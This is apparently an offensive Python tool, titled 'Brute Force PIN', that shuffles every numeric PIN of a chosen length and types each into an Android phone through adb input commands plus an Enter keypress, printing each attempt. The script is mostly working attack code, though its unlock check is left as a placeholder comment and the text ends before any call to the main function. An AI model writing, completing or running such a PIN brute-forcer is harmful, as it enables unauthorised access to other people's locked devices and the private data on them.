import itertools
import random
import pyfiglet
from colorama import Fore, Style, init
import subprocess
import time

# Initialize colorama
init(autoreset=True)

def display_title():
    ascii_banner = pyfiglet.figlet_format("Brute Force PIN", font="slant")
    print(Fore.LIGHTCYAN_EX + ascii_banner)
    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + "Welcome to the Brute Force PIN Tool")
    print(Fore.LIGHTYELLOW_EX + "==================================")
    print()

def send_pin_via_adb(pin_code):
    # Command to send the PIN code using adb
    command = f'adb shell input text {pin_code}'
    subprocess.run(command, shell=True)

    # Command to simulate pressing the enter key
    command = 'adb shell input keyevent 66'
    subprocess.run(command, shell=True)

    # Wait a bit before the next attempt
    time.sleep(0.5)  # Adjust this delay as needed

def brute_force(pin_length):
    digits = '0123456789'
    attempts = 0
    
    # Generate all possible combinations of the given length
    all_combinations = list(itertools.product(digits, repeat=pin_length))
    
    # Shuffle the combinations to make the brute-force more random
    random.shuffle(all_combinations)
    
    for pin_tuple in all_combinations:
        attempts += 1
        pin_code = ''.join(pin_tuple)
        print(Fore.LIGHTGREEN_EX + f'Trying PIN: {pin_code}')
        
        # Send the PIN code via adb
        send_pin_via_adb(pin_code)
        
        # Here you would add logic to detect if the phone is unlocked
        # For example, check for a specific screen state or message
